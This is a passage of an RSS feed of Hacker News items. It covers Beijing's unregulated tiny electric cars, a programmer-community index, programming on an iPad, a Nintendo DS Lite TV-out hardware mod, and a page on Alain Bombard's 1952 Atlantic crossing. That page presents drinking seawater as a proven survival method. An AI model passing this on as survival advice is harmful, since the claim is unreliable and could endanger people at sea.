<p>Having decided that the future of mobility is electric,<strong> </strong>the Chinese government has subsidized sales of regular electric cars since 2010. With <a href="https://insideevs.com/news/394229/plugin-electric-car-sales-china-2019/">close to 1.18 million sold</a> in 2019, China accounts for just over half of electric-vehicle sales globally. Bill Russo, founder and CEO of advisory firm Automobility Limited, sees a “steady and solid rise” in China’s electric-vehicle sales generally. The country has set a top-down target for electric vehicles to <a href="http://energy.mit.edu/news/chinas-transition-to-electric-vehicles/">make up 40%</a> of car sales by 2030, and Russo thinks they’ll have no problem hitting this goal. Tiny cars,<strong> </strong>which first began appearing in the early 2010s,<strong> </strong>have more than double the sales of regular electric cars but have<strong> </strong>never benefited from subsidies. Nor do advertisements for them air on television — instead, they appear on Kuaishou, a short-video platform popular with people living outside China’s big cities. Alongside streamers selling plums by the thousands, and others telling viewers what long-haul trucker life is like, drivers show off their tiny cars. Su Hua, Kuaishou’s founder, has long maintained that his app’s users are not “cool,” unlike those on Douyin, the TikTok predecessor popular with China’s urban elite. Rather, they are ordinary — the kind of people who might be in the market for miniature cars.</p>



<p>As they don’t technically require licenses, tiny cars tend to be popular with migrant workers, who struggle to pay for driving lessons and other car-related costs. The elderly, too, find tiny cars attractive since, up until October of last year, people over 70 could not apply for a driving license in China. They’re also convenient for anybody who wants a car to pick up groceries or their kids from school: No tiny car is longer than 1.5 meters, and their speed tops out at between 40 and 56 kilometers an hour. They’re for the short trips of daily life, not for traveling from one side of the city to another.</p>



<p>Some cities have banned sales of tiny cars — Beijing did so in 2018. Their production isn’t regulated by the government, and since they can’t be insured in many parts of China, it can be difficult for other drivers to get a payout if a tiny car is involved in an accident. Because tiny-car drivers don’t need to take a driving test, other drivers complain, they often go the wrong way and weave in and out of traffic. But since enforcement is lax, sales have quietly resumed in Beijing over the past two years. These little electric cars now exist in a kind of regulatory gray zone.</p>


    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_34-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_34-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_34-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_34-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_34-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_34-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_34-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_44-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_44-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_44-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_44-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_44-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_44-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_44-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_32-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_32-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_32-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_32-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_32-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_32-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_32-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_41-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_41-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_41-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_41-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_41-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_41-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_41-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      
    </figure>

    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_43-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_43-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_43-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_43-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_43-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_43-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_43-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_38-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_38-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_38-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_38-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_38-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_38-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_38-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_31-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_31-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_31-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_31-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_31-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_31-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_31-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_47-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_47-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/EVBeijing_47-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_47-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_47-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_47-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/EVBeijing_47-2800x1868.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      <figcaption>Tiny cars come in a variety of styles and cost between $600 and $2,500.</figcaption>
    </figure>


<hr>



<p><strong>One of the</strong> smaller shops on Zhengyang Road is officially known as Xinlei Scooters, its name emblazoned in white characters on a large red sign above its doors. But inside, past rows of electric scooters, is a smaller, flimsier plaque above the counter announcing its other name: Shitou Cars. This subterfuge is necessary because the police could shut down the operation and confiscate its vehicles if the owners were caught selling tiny cars. Yet because enforcement hasn’t been strict of late, attempts at being covert go only so far: There are several tiny cars parked outside, an open-air showroom.</p>



<p>Xinlei/Shitou’s owner is a middle-aged man with pronounced cheekbones wearing a black tracksuit. He is more attentive to the phone calls he’s constantly receiving than the customers in the shop. It is his wife, with dyed-dark-brown hair and a pink coat, who maintains the sales patter: “I taught an auntie who had never driven a car before. She got the hang of it in three days.” She shows the cars outside to potential customers, opening their doors, instructing people to sit inside, and rolling down the windows. When two old men come in for repair services, her husband finally gets off the phone to deal with them. Meanwhile, two government functionaries in black uniforms pace down the street. They tell one owner to make his storefront tidier, but otherwise overlook the illicit operation.</p>



<p>Part of the reason why tiny cars are so popular is because there has not been an official decision on whether they need license plates. For regular cars, unfettered access to Beijing’s inner city — anywhere within the fifth ring road — is restricted to cars with Beijing plates. Licenses for gas cars are distributed through a special system so competitive that it has generated its own black market. License-plate holders can collect up to $2,700 a year by renting them to those who want to drive in the city. In addition to government subsidies, getting around some of the more onerous aspects of the licensing system is one of the main selling points for regular electric cars.</p>



<p>With Beijing temperatures reaching lows of 4 degrees Celsius in wintertime, Xinlei/Shitou has been selling,<strong> </strong>on average, two of its four-wheeled fully enclosed models every day, a saleswoman boasts. Younger couples prefer four wheels, she adds, while older people usually want three. When asked about the possibility of a tiny car being confiscated, she draws in a breath. “Don’t go on the main roads. Don’t make a business out of it,” she advises.</p>



<p>At least one of Zhengyang Road’s customers isn’t listening: Guo Caiying, who works primarily in the construction-supply industry,<strong> </strong>chauffeurs Fengtai residents around her district. She has a sticker on her tiny car’s back window with the phone number of her car dealer. Guo’s car looks like a golf cart, with cushioned brown seats enclosed by windows. A red <em>fudai</em>, a lucky charm, swings from the ceiling, its characters spelling out “peace.” There is enough space for two people to comfortably sit upright but not enough to extend your legs without hitting the plexiglass divider between driver and passenger. The car tops out at 40 kilometers an hour, and<strong> </strong>as a result, Guo never ventures beyond Fengtai — a borderland where urban and rural meet.</p>



<p>Guo wears the uniform of the countryside: a padded jacket. She is from Henan, a province 800 kilometers southwest of Beijing, and speaks its dialect. Guo starts taking calls from her regulars around 7 a.m., arriving at their door whenever they want to be picked up. She stops driving at 9 a.m., when the traffic police begin work. She characterizes her customers as “people with money who sit in offices.” Once, while in the middle of a trip, Guo saw a cop stop a car like hers. She kept driving, but dropped her passenger off before their destination. Now, if a customer calls her after 9:00, she sends her husband to pick them up with his electric scooter. He charges 75 cents (5RMB), which is half her price. Guo’s flat rate was fixed by the tiny-cab drivers who preceded her.</p>



<p>The economy of tiny cars depends on such informal practices.<strong> </strong>When asked whether she would consider undercutting other drivers, Guo is adamant. “No one can break the rules,” she says. There are local WeChat groups for tiny-car drivers that new owners are inducted into upon purchasing one. Within these groups, members swap information on the whereabouts of local cops and whether anyone has been fined or had their car taken away.</p>



<p>Despite the risks, Guo still thinks it’s worth being a tiny-car driver to make a little pocket money.<strong> </strong>Tiny cars are part of a last-mile economy that flourishes at the beginning and end of the workday. Many Fengtai residents are employed at the local high-tech park, which is host to thousands of businesses. It takes 20 minutes to walk from one end of the park to the other, a trip many would rather make by tiny car. The cars’ main competitors are share bikes, which are cheaper but lack space for luggage and can’t be split with a friend. Tiny cars are also more social — a feature Guo tries to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/tesla-vs-tiny-cars/">https://restofworld.org/2021/tesla-vs-tiny-cars/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/tesla-vs-tiny-cars/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232760</guid>
            <pubDate>Tue, 23 Feb 2021 01:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Full list of online communities for programmers]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26232689">thread link</a>) | @gruppo11
<br/>
February 22, 2021 | https://thehiveindex.com/topics/software-development/?r=hn | <a href="https://web.archive.org/web/*/https://thehiveindex.com/topics/software-development/?r=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page"><h2>About this Topic</h2><p>This is a list of communities dedicated to engineers, software developers, coders, and hackers. Some are online communities dedicated to a particular technology or programming language, and some are general purpose communities or those that help developers early in their career. The communities on this list are an excellent source of inspiration, knowledge-sharing, and networking.</p><h2><div><p>60</p><!-- --><p> Online </p><!-- --><p>Communities</p><!-- --><p> for Software Developers</p></div></h2><p>This topic's list is getting pretty long! Feel free to use the Platform/Feature filters above to cater the search to you.</p><div><p>Know a </p><!-- --><p>Software Development</p><!-- --><p> community that is not on this list yet? Please <a href="https://thehiveindex.com/submit/">submit it</a>!</p></div></div></div>]]>
            </description>
            <link>https://thehiveindex.com/topics/software-development/?r=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232689</guid>
            <pubDate>Tue, 23 Feb 2021 01:01:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using an iOS Device for Programming in 2021 - You'd Be Surprised...]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26232616">thread link</a>) | @jcirclee
<br/>
February 22, 2021 | https://bitsrfr.com/programming-on-ios-2021/ | <a href="https://web.archive.org/web/*/https://bitsrfr.com/programming-on-ios-2021/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <!--kg-card-begin: markdown--><p>A couple of years ago, when someone asked if iOS could be used for software development, the answer was simply "no." That is no longer the case. While the answer is still not an emphatic, "yes," it is a solid, "it depends." In fact, you might be surprised to find out how far development on iOS has come in the past year or two.</p>
<p>For the majority of developers, iOS is a so-so development system - usable but not the best option. For developers who are just SSHing from server to server, or merging Git requests, iOS is great. For other developers, iOS just won't cut it. Programmers building 100,000-line Windows applications are still better off using Windows.</p>
<p>Beyond that, it comes down to personal preference. Some developers prefer iOS's multitasking, shortcuts, and configurations. Some don't.</p>
<p>Most people can get away with using an iPad as their daily driver at this point. However, a good portion of those people would still benefit by having a more traditional operating system (MacOS, Windows 10, Ubuntu, etc) for the times when an iPad doesn't cut it. Those times are becoming rare, but there are still users, for example, who might need to use an application that is only available on a desktop operating system. Another example, and this is a strange one, is iOS app development. It is one of the great paradoxes of modern technology that professional iOS developers cannot complete their work on iOS. Hopefully that will change soon.</p>
<p>Ultimately, without talking to you personally, I cannot say whether iOS would suit your development needs. I can, however, show you what the iPad has to offer. I will go over some general use cases. My hope is to help you choose the best system for you, or to at least provide some interesting insights.</p>
<hr>

<ol>
<li>
<p>There are several compilers available right in the App Store. The most popular of these are <a href="https://libterm.app/">LibTerm</a>, <a href="https://apps.apple.com/us/app/basic-programming-language/id1540244170">BASIC</a>, and <a href="https://seeless.app/">SeeLess</a>. It is possible, with those mentioned and other App Store apps, to compile code written in C, C++, BASIC, Rust, Java, Swift, Go, and other languages, right within the iOS operating system.</p>
</li>
<li>
<p>In addition to all of those compilers, the App Store has some excellent and powerful scripting apps. You can write and run Python (<a href="http://omz-software.com/pythonista/">Pythonista app</a>) and JavaScript (<a href="https://scriptable.app/">Scriptable app</a>) scripts right on an iPhone or iPad. You can also use Apple's visual scripting app, <a href="https://support.apple.com/guide/shortcuts/welcome/ios">Shortcuts</a>.</p>
</li>
<li>
<p><strong>It is even possible, and dare I say easy, to emulate a full version of Alpine Linux on iOS.</strong> The free and open source <a href="https://ish.app/">iSH</a> app makes it possible. So, yes, you can use Vim on your iPad.</p>
</li>
<li>
<p>The App Store also has no shortage of Git clients, SSH clients, IDEs, and text editors. <a href="https://workingcopyapp.com/">Working Copy</a> is a very popular Git client available on the App Store. <a href="https://blink.sh/">Blinkshell</a> is a popular, and open source, SSH client available on the App Store. <a href="https://playdotjs.com/">Play.js</a> is a Node.js and JavaScript IDE. <a href="https://www.textasticapp.com/">Textastic</a> is a feature-rich text editor (that I absolutely love!), complete with Markdown and great file syncing features including an SFTP client and an SSH client.</p>
</li>
<li>
<p><a href="https://sensortower.com/ios/rankings/top/ipad/us/developer-tools?date=2021-02-23">Developer Tools</a> is a <em>Top Category</em> in the App Store. This bodes well for developers who want to use iOS. First, it means Apple is serious about getting developers onto the operating system. Second, it makes finding great development tools very easy. <a href="https://bitsrfr.com/view-top-developer-tools-in-app-store/">Click here for instructions on viewing the <em>Developer Tools</em> category in the App Store</a>.</p>
</li>
</ol>
<hr>

<ol>
<li>
<p>The newness of development and programming on iOS is evident in the immaturity of many development tools. Most compilers in the App Store get not-so-great ratings, and many development apps have ugly or unintuitive user interfaces. The good news here is that there is a lot of opportunity for developers to build and sell new development apps.</p>
</li>
<li>
<p>It is good practice to develop on the operating system that you are developing for. If you are developing Windows apps, it is probably a bad idea to use iOS as your development environment.</p>
</li>
<li>
<p>If you are building 100,000+ line enterprise applications, you probably aren't going to feel quite at home if iOS is your main environment. On the same token, if you are developing enterprise applications, you probably have servers and central repositories that you are pushing to. In that case, it may very well suit you to develop on iOS.</p>
</li>
<li>
<p>iOS does not have good external monitor support. An external monitor can be connected, but it will only display in a 4:3 aspect ratio. However, the keyboard shortcuts and multitasking capabilities of iOS can, in many cases, reduce the need for multiple monitors.</p>
</li>
<li>
<p>The cost of an iPad plus a keyboard, and possibly a mouse/trackpad, is not low. If you are looking for an inexpensive development machine, an iOS device is probably not going to suit your needs.</p>
</li>
</ol>
<p>Bonus shortcoming: iOS is not open source. Though, not everyone will consider this a shortcoming.</p>
<hr>

<h2 id="professionalgamedeveloper">Professional Game Developer</h2>
<p>For the most part, professional game developers will not be well served using iOS as their main development environment. Popular game development tools like Unity and Godot are not available on iOS.</p>
<h2 id="hobbyistgamedeveloper">Hobbyist Game Developer</h2>
<p>Hobbyist and amateur game developers are also generally better off with a desktop operating system. That said, there have been games developed using, among others, the Pythonista app on iOS. <a href="https://github.com/Pythonista-Tools/Pythonista-Tools/blob/master/Games.md">Here is a nice GitHub repository of games made with Pythonista</a>.</p>
<h2 id="professionaliosdeveloper">Professional iOS Developer</h2>
<p>This is where things get a bit awkward. Professional iOS developers are not only better off using MacOS for development, it is a requirement. Xcode, which is only available on MacOS (but rumored to be coming to iOS), is required for publishing iOS apps to the Apple App Store.</p>
<h2 id="hobbyistiosdeveloper">Hobbyist iOS Developer</h2>
<p>This is really the sweet spot for using iOS as a main development machine. Hobbyist developers will have a field day - a field year! - coding on iOS. There are many great tools to explore and there is lots of innovation happening on iOS right now.</p>
<h2 id="networkandorsystemadministrator">Network and/or System Administrator</h2>
<p>A large portion of an administrator's job involves remotely accessing servers and clients. iOS has some great SSH tools. As long as admins are okay with doing that on an iPad screen, I think they can make a nice home on iOS. In fact, <a href="https://www.youtube.com/channel/UC8raOG7HXJoCUygx219fU4A">Christopher Lawley, an iOS YouTuber</a> (great channel if you want to learn more about using iOS for productivity and scripting) says he used an iPad Pro when he worked as a network administrator.</p>
<h2 id="newdeveloperlearningtoprogram">New Developer Learning to Program</h2>
<p>For someone learning to program, I suggest using a desktop operating system like MacOS, Windows, or Ubuntu, because you are going to find better support and help online when you need to troubleshoot or figure out how to do something. Developing on iOS is still new, so there's not a lot of documentation out there. Plus, you are going to learn more about the inner-workings of a computer on a system that exposes more of its inner-workings, and iOS exposes the least of any of them. That said, if you really just want to do it on iOS, I say go for it! And if your only computer is an iPad, then by all means hack the heck out of it!</p>
<h2 id="techdegreeseekingcollegestudent">Tech-Degree-Seeking College Student</h2>
<p>While the iPad can make a great note-taking, task-tracking, and web-surfing device, I would not recommend it as a daily driver for college students who are seeking a degree in computer science or information systems unless you are living on-campus and are willing to use campus-provided computers/labs for your work. Most college programming courses will require the use of Windows or MacOS, and the ability to install various tools on those systems. iPad is not quite flexible enough for that situation.</p>
<hr>
<p>Hopefully I have provided a few key pieces of information to help you decide whether your next development machine will be an iOS device. Will you or won't you? Can you think of any other pros or cons that I haven't mentioned? Let me know!</p>
<p>Until next time, happy hacking!</p>
<!--kg-card-end: markdown-->
                </div></div>]]>
            </description>
            <link>https://bitsrfr.com/programming-on-ios-2021/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232616</guid>
            <pubDate>Tue, 23 Feb 2021 00:50:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nintendo DS-TV-Out Restoration Project]]>
            </title>
            <description>
<![CDATA[
Score 176 | Comments 30 (<a href="https://news.ycombinator.com/item?id=26232600">thread link</a>) | @max-m
<br/>
February 22, 2021 | https://lostnintendohistory.github.io/DS-TV-OUT | <a href="https://web.archive.org/web/*/https://lostnintendohistory.github.io/DS-TV-OUT">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        

<h2 id="introduction">Introduction</h2>

<p>During late 2020, we discovered that the Nintendo DS Lite had a leftover feature in its SoC allowing it to easily have cheap hardware video output. With a little circuitry and some software hacks, we were able to restore it and make it usable for anyone. No FPGA’s, no bulky or cumbersome hardware. This mod is specially useful to revive consoles with only the lower screen, being able to watch the upper screen on your TV. Or to create a GBA Macro with additional TV Output.</p>

<center>
<img src="https://raw.githubusercontent.com/LostNintendoHistory/lostnintendohistory.github.io/main/img/NDSTVOUT/DSTVOUT.jpg" width="250" height="250"><br></center>
<center>
  <b>First iteration of the TV-OUT board in action</b>
  </center>

<h2 id="installation">Installation</h2>

<p>If you are just interested in installation, this is the current method <strong>while we work on simpler methods</strong> and more features you have requested:</p>

<ol>
  <li>Install the <a href="https://ezflash.sosuke.com/wiki/index.php/Flashme">flashME CFW</a> (Custom FirmWare) on your DS Lite</li>
  <li>Connect the Nintendo DS Lite’s upper screen flex to the PCB board.</li>
  <li>Donwload the “NDS TV OUT ENABLE.nds” homebrew from the <a href="https://github.com/LostNintendoHistory/Lost-NDS-TV">NDS TV OUT repo</a></li>
  <li>Download <a href="https://github.com/DS-Homebrew/TWiLightMenu/releases">Twilight Menu</a></li>
  <li>Copy both the NDS TV OUT ENABLE and Twilight Menu .nds files to a flashcart.</li>
  <li>Use flashme to autoboot into the flashcart. You can do this by pressing A + B + Start + Select while booting. Run Twilight menu, and from there, run the enabler homebrew.</li>
  <li>The console will return to Twilight Menu. Now you can use the buttons on the board to swap between the different screen modes (Upper Screen to TV, Bottom Screen to TV, etc) and launch your games.</li>
</ol>

<hr>

<h2 id="software">Software</h2>

<p>The retail firmware of the Nintendo DS Lite disables this specific feature early in the boot process. To reenable it, we use a custom firmware like flashme, which is very easy to install and is required only once, plus a homebrew. Despite that, we are working on an even simpler solution to make it available to as many people as possible, our own custom firmware which integrates patches to enable this feature directly on boot. Additionally, we are currently working with homebrew developers to integrate control of this new feature into existing software for the DS Lite.</p>

<h2 id="hardware">Hardware</h2>

<p>This feature is only found on the Nintendo DS Lite. Nintendo DS Phat does not contain this feature nor does the Nintendo DSi. It is important to remark that <strong>this is not the same hardware</strong> found on Devkits or other special units. This hardware feature is present in virtually <strong>every single Nintendo DS Lite</strong> out there. The reason why it was left there is unknown, but as said before, it is not related to development units, those use a different video capture hardware. Perhaps Nintendo imagined the Nintendo Switch as early as 2006?</p>

<center><img src="https://raw.githubusercontent.com/LostNintendoHistory/lostnintendohistory.github.io/main/img/NDSTVOUT/PCB_Rev_11.png" width="350" height="400"></center>

<p>We only need a few extra hardware components to make this video signal usable. You will be able to download the schematics and gerber files for our open hardware circuit board <a href="https://github.com/LostNintendoHistory/Lost-NDS-TV">from the repository</a>. The latest version is revision 1.2 which fixes some minor issues with a component in the board.</p>

<center>
<img src="https://raw.githubusercontent.com/LostNintendoHistory/lostnintendohistory.github.io/main/img/NDSTVOUT/Prototype.jpg" width="350" height="350"><br>
</center>
<center>
  <b>First prototype and tests before designing a proper board</b></center>


<p>The final, production-ready board contains a DAC (Digital to Analogue Converter) which turns the 10 bits digital signal at 16.7 MHz provided by the DS Lite into a proper analogue signal. This signal then goes through an operational amplifier and it’s ready to be delivered to your nearest TV trough composite video.</p>

<p>We are currently considering creating an additional PCB revision which would allow to install the mod on consoles without lossing a working upper screen.</p>


      </section>
    </div></div>]]>
            </description>
            <link>https://lostnintendohistory.github.io/DS-TV-OUT</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232600</guid>
            <pubDate>Tue, 23 Feb 2021 00:48:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Bombard Story]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 26 (<a href="https://news.ycombinator.com/item?id=26232597">thread link</a>) | @jbergstroem
<br/>
February 22, 2021 | https://greatestadventurers.com/the-bombard-story/ | <a href="https://web.archive.org/web/*/https://greatestadventurers.com/the-bombard-story/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-618" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
					
			
		<div itemprop="text">
			<p><strong>The Bombard Story</strong> is the account of <a href="https://en.wikipedia.org/wiki/Alain_Bombard">Alain Bombard’s</a> amazing journey in 1952 across the <a href="http://greatestadventurers.com/the-north-west-passage-by-roal-amundsen/">Atlantic</a> on a small 14-foot inflatable boat. Alain Bombard left without food or fresh water and sailed 4.400 kilometers. He lost 25 kg. but proved his point: Man can actually survive on ocean water for an extended period of time!</p>
<figure id="attachment_619" aria-describedby="caption-attachment-619"><img loading="lazy" src="http://greatestadventurers.com/wp-content/uploads/2021/02/TheBombardStory1953.jpg" alt="The Bombard Story" width="300" height="203" data-src="http://greatestadventurers.com/wp-content/uploads/2021/02/TheBombardStory1953.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption id="caption-attachment-619">In this small vessel Bombard sailed across the Atlantic – without freshwater</figcaption></figure>
<p>As a doctor, Bombard was concerned about the hundreds of deaths at sea every year related to sailors drinking ocean water. He developed the theory that humans can not just survive but live for years on seawater. This sounds very strange, but his big idea was to begin drinking seawater, while you are still hydrated – and in small quantities. It turns out that saltwater is only dangerous if you are dehydrated and suddenly drink large amounts of it. – The way shipwrecked sailors typically would do when they run out of fresh water. From the book:</p>
<blockquote><p>For some time I had made a study of the resistance of the human organism to privations and had convinced myself that it was possible for an individual to survive beyond the limits normally assigned by physiological science. I had paid particular attention to the case histories of political deportees, prisoners, and undernourished populations. But, with my background as a doctor, for whom the teachings of science remain a dead letter unless they can find practical application, my theoretical studies only seemed to lead to the question: ‘What use can made of this knowledge?’</p></blockquote>
<p>Bombard ate spoonfuls of plankton that he collected in a fine net and he also drank juice made from pressed fish he caught along the way. Sound disgusting, but the man survived and he might have discovered an important piece of knowledge for survival on the ocean.</p>
<p>Download the free PDF e-book here (223 pages/38MB):</p>
<h3><img loading="lazy" src="http://greatestadventurers.com/wp-content/uploads/2020/08/PDF-download-e1597850191432.png" alt="" width="35" height="35" data-src="http://greatestadventurers.com/wp-content/uploads/2020/08/PDF-download-e1597850191432.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">&nbsp;<a href="http://greatestadventurers.com/wp-content/uploads/2021/02/The-Bombard-Story-1953.pdf">The Bombard Story 1953</a></h3>

		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://greatestadventurers.com/the-bombard-story/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26232597</guid>
            <pubDate>Tue, 23 Feb 2021 00:48:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TagTime Web: stochastic time tracking web app]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26232552">thread link</a>) | @reimbar
<br/>
February 22, 2021 | https://smitop.com/post/ttw/ | <a href="https://web.archive.org/web/*/https://smitop.com/post/ttw/">archive.org</a>
